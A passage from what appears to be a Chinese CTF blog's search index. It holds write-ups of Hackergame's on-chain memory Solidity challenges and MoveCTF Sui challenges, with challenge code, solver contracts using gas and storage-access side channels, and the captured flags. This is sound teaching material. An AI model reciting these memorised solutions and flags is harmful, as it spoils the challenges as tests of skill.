) { try this . memorize_revert ( m , n ) { } catch ( bytes memory ) { } uint16 recalled = m . recall (); return recalled == n ; } function memorize_revert ( MemoryMaster m , uint16 n ) external { m . memorize ( n ); revert (); } } \u7ec8\u6781\u6311\u6218 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint256 n ) external view ; function recall () external view returns ( uint256 ); } contract Challenge { function test ( MemoryMaster m , uint256 n ) external returns ( bool ) { m . memorize ( n ); uint256 recalled = m . recall (); return recalled == n ; } } \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u7f16\u5199\u5305\u542b\u51fd\u6570 memorize \u548c\u51fd\u6570 recall \u7684\u5408\u7ea6 MemoryMaster \uff0c\u5408\u7ea6 Challenge \u5c06\u9996\u5148\u8c03\u7528\u51fd\u6570 memorize \u5e76\u4f20\u5165\u53c2\u6570 n \uff0c\u968f\u540e\u8c03\u7528\u51fd\u6570 recall \u5e76\u671f\u671b\u8fd4\u56de n \u3002 \u8bb0\u5fc6\u7ec3\u4e60 \u00b6 \u672c\u9898\u6ca1\u6709\u5bf9\u51fd\u6570 memorize \u548c\u51fd\u6570 recall \u8fdb\u884c\u4efb\u4f55\u9650\u5236\uff0c\u56e0\u800c\u53ef\u4ee5\u76f4\u63a5\u501f\u52a9\u72b6\u6001\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity 0.8.17 ; contract MemoryMaster { uint256 n ; function memorize ( uint256 _n ) public { n = _n ; } function recall () public view returns ( uint256 ) { return n ; } } Flag \u00b6 flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_dd0d6977ef} \u725b\u5200\u5c0f\u8bd5 \u00b6 \u51fd\u6570 memorize \u88ab\u8c03\u7528\u540e\u5373 revert \uff0c\u5c3d\u7ba1\u7531\u4e8e try/catch \u7684\u5b58\u5728\uff0c\u4e0d\u5f71\u54cd\u540e\u7eed\u64cd\u4f5c\uff0c\u4f46\u65e0\u6cd5\u518d\u4f7f\u7528\u72b6\u6001\u53d8\u91cf\u6765\u4f20\u9012 n \u503c \u4fbf\u60f3\u5230\u53ef\u4ee5\u501f\u52a9 gasleft() \uff0c\u6c7d\u6cb9\u7684\u6d88\u8017\u4e0d\u53d7\u56de\u6eda\u7684\u5f71\u54cd\uff0c\u5e76\u4e14 n \u7684\u7c7b\u578b\u4e5f\u7531 uint256 \u8c03\u6574\u4e3a\u4e86 uint16 \uff0c\u4e0d\u8fc7\u5b9e\u65bd\u8d77\u6765\u5c31\u6ca1\u90a3\u4e48\u7b80\u5355\u4e86 :( \u68b3\u7406\u4e00\u4e0b\u5df2\u77e5\u7684\u4fe1\u606f \u4ea4\u6613\u7684\u521d\u59cb\u6c7d\u6cb9\u91cf\u53d7 geth \u7684 --rpc.gascap \u63a7\u5236\uff0c\u9ed8\u8ba4\u4e3a \\(50000000\\) 1 \u6bcf\u6b21\u51fd\u6570\u8c03\u7528\u4f1a\u4f20\u5165\u5269\u4f59\u6c7d\u6cb9\u7684 63/64 \u82e5\u51fd\u6570 memorize \u6545\u610f\u6d88\u8017\u6389 x \u6c7d\u6cb9\uff0c\u90a3\u4e48\u4f20\u5165 recall \u7684\u6c7d\u6cb9\u91cf\u4e3a (50000000 - k - x) * 63 / 64 \u3002 \\(50000000\\) \u6620\u5c04\u5230 \\(2^{16}\\) \uff0c\u6bcf\u4e2a\u533a\u95f4\u7ea6 \\(763\\) \u6c7d\u6cb9\uff0c\u8003\u8651\u5230 63/64 \uff0c\u53ef\u4ee5\u4ee5 \\(720\\) \u4e3a\u4e00\u4e2a\u5355\u4f4d gasleft() \u5305\u542b GAS \u64cd\u4f5c\u7801\uff0c\u83b7\u53d6\u8be5\u64cd\u4f5c\u6267\u884c\u7ed3\u675f\u540e\u5269\u4f59\u7684\u6c7d\u6cb9\u91cf 2 \u9996\u5148\u53ef\u5229\u7528 revert \u83b7\u5f97\u6267\u884c\u5230\u51fd\u6570 recall \u7684\u5269\u4f59\u6c7d\u6cb9\u91cf\uff0c\u5e76\u8ba1\u7b97\u51fa k 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 pragma solidity 0.8.17 ; import \"@openzeppelin/contracts/utils/Strings.sol\" ; contract MemoryMaster { function memorize ( uint16 n ) public { uint256 g = gasleft (); while ( gasleft () > g - 720 * uint256 ( n )) gasleft (); } function recall () public view returns ( uint16 ) { uint256 n = gasleft (); revert ( Strings . toString ( n )); return uint16 ( n ); } } \u63d0\u4ea4\u5b57\u8282\u7801\u5230\u670d\u52a1\u5668\uff0c\u7531\u6b64\u53ef\u5927\u81f4\u7b97\u51fa k = 30040 ( (50000000 - k - 27688 * 720) * 63 / 64 = 29565309 ) 1 2 3 4 Testing 1 /10... n = 27688 ... web3.exceptions.ContractLogicError: execution reverted: 29565309 Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity 0.8.17 ; contract MemoryMaster { function memorize ( uint16 n ) public { uint256 g = gasleft (); while ( gasleft () > g - 720 * uint256 ( n )) gasleft (); } function recall () public view returns ( uint16 ) { return uint16 (( 50000000 - 30040 - gasleft () * 64 / 63 ) / 720 ); } } Flag \u00b6 flag{Gas_gAs_gaS_c4n_b3_us3d_aS_s1de_ChaNNel_5a01148fd5} \u7ec8\u6781\u6311\u6218 \u00b6 \u51fd\u6570 memorize \u6dfb\u52a0\u4e86 view \u4fee\u9970\u7b26\uff0c\u56e0\u800c\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\u53d8\u91cf\uff0c\u800c n \u7684\u7c7b\u578b\u53c8\u6062\u590d\u4e3a uint256 \uff0c\u4e0a\u4e00\u9898\u7684\u7b56\u7565\u4e5f\u4e0d\u80fd\u518d\u4f7f\u7528 \u4e00\u90e8\u5206\u64cd\u4f5c\u7801\uff0c\u5982 SSTORE \u3001 SLOAD \uff0c\u6d88\u8017\u7684\u6c7d\u6cb9\u91cf\u4e0e\u8bbf\u95ee\u7684\u4f4d\u7f6e\u662f\u5426\u662f\u521d\u6b21\u8bbf\u95ee\u6709\u5173\uff0c\u51b7\u8bbf\u95ee\u8981\u6d88\u8017\u66f4\u591a\u7684\u6c7d\u6cb9 \u53ef\u4ee5\u901a\u8fc7\u6545\u610f\u8bbf\u95ee\u4e00\u4e9b\u7279\u5b9a\u7684\u4f4d\u7f6e\u6765\u5411 recall \u4f20\u9012 n \u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528 SLOAD \uff0c\u8bbf\u95ee\u51b7/\u70ed\u5b58\u50a8\u4f4d\u7f6e\u7684\u5f00\u9500\u5206\u522b\u4e3a 2100 / 100 \uff0c\u6216\u501f\u52a9\u4e8e\u5176\u5b83 ADDRESS_TOUCHING_OPCODES \u3001 STORAGE_TOUCHING_OPCODES 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 pragma solidity 0.8.17 ; contract MemoryMaster { mapping ( uint16 => bool ) access ; function memorize ( uint256 n ) external view { for ( uint16 i = 0 ; i < 256 ; i ++ ) { if (( n >> i ) & 1 != 0 ) access [ i ]; } } function recall () external view returns ( uint256 ) { uint256 n = 0 ; for ( uint16 i = 256 ; i > 0 ; i -- ) { // i \u51cf\u5230 -1 \u4f1a\u5bfc\u81f4 revert n <<= 1 ; uint256 g = gasleft (); access [ i - 1 ]; if ( g - gasleft () < 1000 ) n += 1 ; } return n ; } } \u72b6\u6001\u56de\u6eda\u5305\u62ec\u5730\u5740\u548c\u5b58\u50a8\u4f4d\u7f6e\u7684\u51b7\u70ed\u72b6\u6001 Flag \u00b6 flag{EVM_1s_c0mPl1c4ted_bUt_Rea11y_FuN_T0_d1g_Deeper_9d3b7f6932} \u53c2\u8003\u8d44\u6599 \u00b6 EIP-2929: Gas cost increases for state access opcodes Appendix - Dynamic Gas Costs Command-line Options | Go Ethereum \u21a9 EVM Codes - An Ethereum Virtual Machine Opcodes Interactive Reference \u21a9","title":"\u94fe\u4e0a\u8bb0\u5fc6\u5927\u5e08"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_1","text":"\u542c\u8bf4\u4f60\u5728\u533a\u5757\u94fe\u4e0a\u90e8\u7f72\u7684\u667a\u80fd\u5408\u7ea6\u6709\u8fc7\u76ee\u4e0d\u5fd8\u7684\u80fd\u529b\u3002 main.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 from web3 import Web3 from web3.middleware import geth_poa_middleware import os import json import time import shutil challenge_id = int ( input ( 'The challenge you want to play (1 or 2 or 3): ' )) assert challenge_id == 1 or challenge_id == 2 or challenge_id == 3 player_bytecode = bytes . fromhex ( input ( 'Player bytecode: ' )) print ( 'Launching geth...' ) shutil . copytree ( '/data' , '/dev/shm/geth' ) os . system ( 'geth --datadir /dev/shm/geth --nodiscover --mine --unlock 0x2022af4DCbb9dA7F41cBD3dD8CdB4134D4e6DDe6 --password password.txt --verbosity 0 --datadir.minfreedisk 0 &' ) time . sleep ( 2 ) w3 = Web3 ( Web3 . IPCProvider ( '/dev/shm/geth/geth.ipc' )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) w3 . eth . default_account = w3 . eth . accounts [ 0 ] w3 . geth . personal . unlock_account ( w3 . eth . default_account , open ( 'password.txt' ) . read () . strip ()) print ( 'Deploying challenge contract...' ) bytecode , abi = json . load ( open ( f 'contract { challenge_id } .json' )) Challenge = w3 . eth . contract ( abi = abi , bytecode = bytecode ) tx_hash = Challenge . constructor () . transact () tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( 'Challenge contract address:' , tx_receipt . contractAddress ) challenge = w3 . eth . contract ( address = tx_receipt . contractAddress , abi = abi ) print ( 'Deploying player contract...' ) tx_hash = w3 . eth . send_transaction ({ 'to' : None , 'data' : player_bytecode }) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( 'Player contract address:' , tx_receipt . contractAddress ) for i in range ( 10 ): print ( f 'Testing { i + 1 } /10...' ) if challenge_id == 2 : n = int . from_bytes ( os . urandom ( 2 ), 'big' ) else : n = int . from_bytes ( os . urandom ( 32 ), 'big' ) print ( f 'n = { n } ' ) if challenge . functions . test ( tx_receipt . contractAddress , n ) . call (): print ( 'Test passed!' ) else : print ( 'Test failed!' ) exit ( - 1 ) print ( open ( f 'flag { challenge_id } ' ) . read ()) compile.py 1 2 3 4 5 6 7 8 9 from solcx import compile_source import json for i in 1 , 2 , 3 : compiled_sol = compile_source ( open ( f 'challenge { i } .sol' ) . read (), output_values = [ 'abi' , 'bin' ]) contract_interface = compiled_sol [ '<stdin>:Challenge' ] bytecode = contract_interface [ 'bin' ] abi = contract_interface [ 'abi' ] json . dump (( bytecode , abi ), open ( f 'contract { i } .json' , 'w' )) genesis.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 { \"config\" : { \"chainId\" : 2022 , \"homesteadBlock\" : 0 , \"eip150Block\" : 0 , \"eip155Block\" : 0 , \"eip158Block\" : 0 , \"byzantiumBlock\" : 0 , \"constantinopleBlock\" : 0 , \"petersburgBlock\" : 0 , \"istanbulBlock\" : 0 , \"muirGlacierBlock\" : 0 , \"berlinBlock\" : 0 , \"londonBlock\" : 0 , \"arrowGlacierBlock\" : 0 , \"grayGlacierBlock\" : 0 , \"clique\" : { \"period\" : 0 , \"epoch\" : 30000 } }, \"alloc\" : { \"0x2022af4DCbb9dA7F41cBD3dD8CdB4134D4e6DDe6\" : { \"balance\" : \"0x56bc75e2d63100000\" } }, \"coinbase\" : \"0x0000000000000000000000000000000000000000\" , \"difficulty\" : \"0x1\" , \"gasLimit\" : \"0x1c9c380\" , \"extraData\" : \"0x00000000000000000000000000000000000000000000000000000000000000002022af4dcbb9da7f41cbd3dd8cdb4134d4e6dde60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\" , \"nonce\" : \"0x0000000000000042\" , \"mixhash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\" , \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\" , \"timestamp\" : \"0x00\" } Dockerfile 1 2 3 4 5 6 7 8 9 FROM ubuntu:22.04 RUN apt update && apt install -y software-properties-common && add-apt-repository -y ppa:ethereum/ethereum && apt update && apt install -y ethereum python3-pip RUN python3 -m pip install web3 py-solc-x RUN python3 -c \"from solcx import install_solc; install_solc(version='latest')\" COPY genesis.json privatekey.txt password.txt main.py challenge1.sol challenge2.sol challenge3.sol compile.py / RUN geth init --datadir data genesis.json RUN geth --datadir data account import --password password.txt privatekey.txt RUN python3 compile.py CMD [ \"/usr/bin/python3\" , \"-u\" , \"/main.py\" ]","title":"\u9898\u76ee"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint256 n ) external ; function recall () external view returns ( uint256 ); } contract Challenge { function test ( MemoryMaster m , uint256 n ) external returns ( bool ) { m . memorize ( n ); uint256 recalled = m . recall (); return recalled == n ; } }","title":"\u8bb0\u5fc6\u7ec3\u4e60"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint16 n ) external ; function recall () external view returns ( uint16 ); } contract Challenge { function test ( MemoryMaster m , uint16 n ) external returns ( bool ) { try this . memorize_revert ( m , n ) { } catch ( bytes memory ) { } uint16 recalled = m . recall (); return recalled == n ; } function memorize_revert ( MemoryMaster m , uint16 n ) external { m . memorize ( n ); revert (); } }","title":"\u725b\u5200\u5c0f\u8bd5"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint256 n ) external view ; function recall () external view returns ( uint256 ); } contract Challenge { function test ( MemoryMaster m , uint256 n ) external returns ( bool ) { m . memorize ( n ); uint256 recalled = m . recall (); return recalled == n ; } }","title":"\u7ec8\u6781\u6311\u6218"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_5","text":"\u9700\u8981\u7f16\u5199\u5305\u542b\u51fd\u6570 memorize \u548c\u51fd\u6570 recall \u7684\u5408\u7ea6 MemoryMaster \uff0c\u5408\u7ea6 Challenge \u5c06\u9996\u5148\u8c03\u7528\u51fd\u6570 memorize \u5e76\u4f20\u5165\u53c2\u6570 n \uff0c\u968f\u540e\u8c03\u7528\u51fd\u6570 recall \u5e76\u671f\u671b\u8fd4\u56de n \u3002","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_6","text":"\u672c\u9898\u6ca1\u6709\u5bf9\u51fd\u6570 memorize \u548c\u51fd\u6570 recall \u8fdb\u884c\u4efb\u4f55\u9650\u5236\uff0c\u56e0\u800c\u53ef\u4ee5\u76f4\u63a5\u501f\u52a9\u72b6\u6001\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity 0.8.17 ; contract MemoryMaster { uint256 n ; function memorize ( uint256 _n ) public { n = _n ; } function recall () public view returns ( uint256 ) { return n ; } }","title":"\u8bb0\u5fc6\u7ec3\u4e60"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#flag","text":"flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_dd0d6977ef}","title":"Flag"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_7","text":"\u51fd\u6570 memorize \u88ab\u8c03\u7528\u540e\u5373 revert \uff0c\u5c3d\u7ba1\u7531\u4e8e try/catch \u7684\u5b58\u5728\uff0c\u4e0d\u5f71\u54cd\u540e\u7eed\u64cd\u4f5c\uff0c\u4f46\u65e0\u6cd5\u518d\u4f7f\u7528\u72b6\u6001\u53d8\u91cf\u6765\u4f20\u9012 n \u503c \u4fbf\u60f3\u5230\u53ef\u4ee5\u501f\u52a9 gasleft() \uff0c\u6c7d\u6cb9\u7684\u6d88\u8017\u4e0d\u53d7\u56de\u6eda\u7684\u5f71\u54cd\uff0c\u5e76\u4e14 n \u7684\u7c7b\u578b\u4e5f\u7531 uint256 \u8c03\u6574\u4e3a\u4e86 uint16 \uff0c\u4e0d\u8fc7\u5b9e\u65bd\u8d77\u6765\u5c31\u6ca1\u90a3\u4e48\u7b80\u5355\u4e86 :( \u68b3\u7406\u4e00\u4e0b\u5df2\u77e5\u7684\u4fe1\u606f \u4ea4\u6613\u7684\u521d\u59cb\u6c7d\u6cb9\u91cf\u53d7 geth \u7684 --rpc.gascap \u63a7\u5236\uff0c\u9ed8\u8ba4\u4e3a \\(50000000\\) 1 \u6bcf\u6b21\u51fd\u6570\u8c03\u7528\u4f1a\u4f20\u5165\u5269\u4f59\u6c7d\u6cb9\u7684 63/64 \u82e5\u51fd\u6570 memorize \u6545\u610f\u6d88\u8017\u6389 x \u6c7d\u6cb9\uff0c\u90a3\u4e48\u4f20\u5165 recall \u7684\u6c7d\u6cb9\u91cf\u4e3a (50000000 - k - x) * 63 / 64 \u3002 \\(50000000\\) \u6620\u5c04\u5230 \\(2^{16}\\) \uff0c\u6bcf\u4e2a\u533a\u95f4\u7ea6 \\(763\\) \u6c7d\u6cb9\uff0c\u8003\u8651\u5230 63/64 \uff0c\u53ef\u4ee5\u4ee5 \\(720\\) \u4e3a\u4e00\u4e2a\u5355\u4f4d gasleft() \u5305\u542b GAS \u64cd\u4f5c\u7801\uff0c\u83b7\u53d6\u8be5\u64cd\u4f5c\u6267\u884c\u7ed3\u675f\u540e\u5269\u4f59\u7684\u6c7d\u6cb9\u91cf 2 \u9996\u5148\u53ef\u5229\u7528 revert \u83b7\u5f97\u6267\u884c\u5230\u51fd\u6570 recall \u7684\u5269\u4f59\u6c7d\u6cb9\u91cf\uff0c\u5e76\u8ba1\u7b97\u51fa k 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 pragma solidity 0.8.17 ; import \"@openzeppelin/contracts/utils/Strings.sol\" ; contract MemoryMaster { function memorize ( uint16 n ) public { uint256 g = gasleft (); while ( gasleft () > g - 720 * uint256 ( n )) gasleft (); } function recall () public view returns ( uint16 ) { uint256 n = gasleft (); revert ( Strings . toString ( n )); return uint16 ( n ); } } \u63d0\u4ea4\u5b57\u8282\u7801\u5230\u670d\u52a1\u5668\uff0c\u7531\u6b64\u53ef\u5927\u81f4\u7b97\u51fa k = 30040 ( (50000000 - k - 27688 * 720) * 63 / 64 = 29565309 ) 1 2 3 4 Testing 1 /10... n = 27688 ... web3.exceptions.ContractLogicError: execution reverted: 29565309","title":"\u725b\u5200\u5c0f\u8bd5"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity 0.8.17 ; contract MemoryMaster { function memorize ( uint16 n ) public { uint256 g = gasleft (); while ( gasleft () > g - 720 * uint256 ( n )) gasleft (); } function recall () public view returns ( uint16 ) { return uint16 (( 50000000 - 30040 - gasleft () * 64 / 63 ) / 720 ); } }","title":"Exploit"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#flag_1","text":"flag{Gas_gAs_gaS_c4n_b3_us3d_aS_s1de_ChaNNel_5a01148fd5}","title":"Flag"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_8","text":"\u51fd\u6570 memorize \u6dfb\u52a0\u4e86 view \u4fee\u9970\u7b26\uff0c\u56e0\u800c\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\u53d8\u91cf\uff0c\u800c n \u7684\u7c7b\u578b\u53c8\u6062\u590d\u4e3a uint256 \uff0c\u4e0a\u4e00\u9898\u7684\u7b56\u7565\u4e5f\u4e0d\u80fd\u518d\u4f7f\u7528 \u4e00\u90e8\u5206\u64cd\u4f5c\u7801\uff0c\u5982 SSTORE \u3001 SLOAD \uff0c\u6d88\u8017\u7684\u6c7d\u6cb9\u91cf\u4e0e\u8bbf\u95ee\u7684\u4f4d\u7f6e\u662f\u5426\u662f\u521d\u6b21\u8bbf\u95ee\u6709\u5173\uff0c\u51b7\u8bbf\u95ee\u8981\u6d88\u8017\u66f4\u591a\u7684\u6c7d\u6cb9 \u53ef\u4ee5\u901a\u8fc7\u6545\u610f\u8bbf\u95ee\u4e00\u4e9b\u7279\u5b9a\u7684\u4f4d\u7f6e\u6765\u5411 recall \u4f20\u9012 n \u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528 SLOAD \uff0c\u8bbf\u95ee\u51b7/\u70ed\u5b58\u50a8\u4f4d\u7f6e\u7684\u5f00\u9500\u5206\u522b\u4e3a 2100 / 100 \uff0c\u6216\u501f\u52a9\u4e8e\u5176\u5b83 ADDRESS_TOUCHING_OPCODES \u3001 STORAGE_TOUCHING_OPCODES 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 pragma solidity 0.8.17 ; contract MemoryMaster { mapping ( uint16 => bool ) access ; function memorize ( uint256 n ) external view { for ( uint16 i = 0 ; i < 256 ; i ++ ) { if (( n >> i ) & 1 != 0 ) access [ i ]; } } function recall () external view returns ( uint256 ) { uint256 n = 0 ; for ( uint16 i = 256 ; i > 0 ; i -- ) { // i \u51cf\u5230 -1 \u4f1a\u5bfc\u81f4 revert n <<= 1 ; uint256 g = gasleft (); access [ i - 1 ]; if ( g - gasleft () < 1000 ) n += 1 ; } return n ; } } \u72b6\u6001\u56de\u6eda\u5305\u62ec\u5730\u5740\u548c\u5b58\u50a8\u4f4d\u7f6e\u7684\u51b7\u70ed\u72b6\u6001","title":"\u7ec8\u6781\u6311\u6218"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#flag_2","text":"flag{EVM_1s_c0mPl1c4ted_bUt_Rea11y_FuN_T0_d1g_Deeper_9d3b7f6932}","title":"Flag"},{"location":"blockchain/hackergame/memory_master_on_the_chain/#_9","text":"EIP-2929: Gas cost increases for state access opcodes Appendix - Dynamic Gas Costs Command-line Options | Go Ethereum \u21a9 EVM Codes - An Ethereum Virtual Machine Opcodes Interactive Reference \u21a9","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/movectf/checkin/","tags":["move"],"text":"#move .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 checkin.move 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 module movectf :: checkin { use sui :: event ; use sui :: tx_context ::{ Self , TxContext }; const ESTRING : u64 = 0 ; struct Flag has copy , drop { sender : address , flag : bool , } public entry fun get_flag ( string : vector < u8 > , ctx : & mut TxContext ) { assert! ( string == b\"MoveBitCTF\" , ESTRING ); event :: emit ( Flag { sender : tx_context :: sender ( ctx ), flag : true , }); } } Move.toml 1 2 3 4 5 6 7 8 9 [package] name = \"movectf\" version = \"0.0.1\" [dependencies] Sui = { git = \"https://github.com/MystenLabs/sui.git\" , subdir = \"crates/sui-framework/packages/sui-framework\" , rev = \"framework/testnet\" } [addresses] movectf = \"0x0\" \u89e3\u9898\u601d\u8def \u00b6 \u5207\u6362\u7f51\u7edc 1 2 $ sui client new-env --alias movectf --rpc http://8.217.173.179:9001 $ sui client switch --env movectf \u8c03\u7528 get_flag() \u51fd\u6570\u4ee5\u89e6\u53d1 Flag \u4e8b\u4ef6 1 $ sui client call --function get_flag --args MoveBitCTF --module checkin --package <packageId> --gas-budget 10000000 Flag \u00b6 flag{31pSrCCf7pjK}_CHECKINNEW References \u00b6 Sui Client CLI","title":"Checkin"},{"location":"blockchain/movectf/checkin/#_1","text":"checkin.move 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 module movectf :: checkin { use sui :: event ; use sui :: tx_context ::{ Self , TxContext }; const ESTRING : u64 = 0 ; struct Flag has copy , drop { sender : address , flag : bool , } public entry fun get_flag ( string : vector < u8 > , ctx : & mut TxContext ) { assert! ( string == b\"MoveBitCTF\" , ESTRING ); event :: emit ( Flag { sender : tx_context :: sender ( ctx ), flag : true , }); } } Move.toml 1 2 3 4 5 6 7 8 9 [package] name = \"movectf\" version = \"0.0.1\" [dependencies] Sui = { git = \"https://github.com/MystenLabs/sui.git\" , subdir = \"crates/sui-framework/packages/sui-framework\" , rev = \"framework/testnet\" } [addresses] movectf = \"0x0\"","title":"\u9898\u76ee"},{"location":"blockchain/movectf/checkin/#_2","text":"\u5207\u6362\u7f51\u7edc 1 2 $ sui client new-env --alias movectf --rpc http://8.217.173.179:9001 $ sui client switch --env movectf \u8c03\u7528 get_flag() \u51fd\u6570\u4ee5\u89e6\u53d1 Flag \u4e8b\u4ef6 1 $ sui client call --function get_flag --args MoveBitCTF --module checkin --package <packageId> --gas-budget 10000000","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/movectf/checkin/#flag","text":"flag{31pSrCCf7pjK}_CHECKINNEW","title":"Flag"},{"location":"blockchain/movectf/checkin/#references","text":"Sui Client CLI","title":"References"},{"location":"blockchain/movectf/dynamic_matrix_traversal/","tags":["move","pascal's triangle"],"text":"#move #pascal's triangle .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 matrix.move 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 module dynamic_matrix_traversal :: matrix { use std :: vector ; use sui :: event ; use sui :: object ::{ Self , UID }; use sui :: transfer ; use sui :: tx_context ::{ Self , TxContext }; const TARGET_VALUE_1 : u64 = 2794155 ; const TARGET_VALUE_2 : u64 = 14365 ; const ERROR_RESULT_1 : u64 = 1 ; const ERROR_RESULT_2 : u64 = 2 ; const ERROR_PARAM_1 : u64 = 3 ; const ERROR_PARAM_2 : u64 = 4 ; struct Flag has copy , drop { user : address , flag : bool } struct Record has key { id : UID , count_1 : u64 , count_2 : u64 , count_3 : u64 , count_4 : u64 } fun init ( ctx : & mut sui :: tx_context :: TxContext ) { let record = Record { id : object :: new ( ctx ), count_1 : 0 , count_2 : 0 , count_3 : 0 , count_4 : 0 }; transfer :: share_object ( record ); } fun up ( m : u64 , n : u64 ): u64 { let f : vector < vector < u64 >> = vector :: empty (); let i : u64 = 0 ; while ( i < m ) { let row : vector < u64 > = vector :: empty (); let j : u64 = 0 ; while ( j < n ) { if ( j == 0 || i == 0 ) { vector :: push_back ( & mut row , 1 ); } else { let f1 = * vector :: borrow ( & f , i - 1 ); let j1 = * vector :: borrow ( & row , j - 1 ); let val = * vector :: borrow ( & f1 , j ) + j1 ; vector :: push_back ( & mut row , val ); }; j = j + 1 ; }; vector :: push_back ( & mut f , row ); i = i + 1 ; }; let fr = * vector :: borrow ( & f , m - 1 ); let result = * vector :: borrow ( & fr , n - 1 ); result } public entry fun execute ( record : & mut Record , m : u64 , n : u64 ) { if ( record . count_1 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_1 , ERROR_RESULT_1 ); record . count_1 = m ; record . count_2 = n ; } else if ( record . count_3 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_2 , ERROR_RESULT_2 ); record . count_3 = m ; record . count_4 = n ; } } public entry fun get_flag ( record : & Record , ctx : & mut TxContext ) { assert! ( record . count_1 < record . count_3 , ERROR_PARAM_1 ); assert! ( record . count_2 > record . count_4 , ERROR_PARAM_2 ); event :: emit ( Flag { user : tx_context :: sender ( ctx ), flag : true }); } #[test_only] public fun init2 ( ctx : & mut sui :: tx_context :: TxContext ) { init ( ctx ) } } Move.toml 1 2 3 4 5 6 7 8 9 [ package ] name = \"dynamic_matrix_traversal\" version = \"0.0.1\" [ dependencies ] Sui = { git = \"https://github.com/MystenLabs/sui.git\" , subdir = \"crates/sui-framework/packages/sui-framework\" , rev = \"framework/testnet\" } [ addresses ] dynamic_matrix_traversal = \"0x0\" \u89e3\u9898\u601d\u8def \u00b6 count_1 \u3001 count_2 \u3001 count_3 \u548c count_4 \u521d\u59cb\u503c\u4e3a \\(0\\) \uff0c\u6700\u7ec8\u9700\u8981\u6ee1\u8db3 count_1 < count_3 \u4e14 count_2 > count_4 \u901a\u8fc7 execute() \u53ef\u4ee5\u5206\u522b\u8bbe\u7f6e count_1 & count_2 \u4ee5\u53ca count_3 & count_4 \uff0c\u4f46 up(m, n) \u7684\u6267\u884c\u7ed3\u679c\u5e94\u7b49\u4e8e\u7279\u5b9a\u7684 TARGET_VALUE 1 2 3 4 5 6 7 8 9 10 11 12 13 public entry fun execute ( record : & mut Record , m : u64 , n : u64 ) { if ( record . count_1 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_1 , ERROR_RESULT_1 ); record . count_1 = m ; record . count_2 = n ; } else if ( record . count_3 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_2 , ERROR_RESULT_2 ); record . count_3 = m 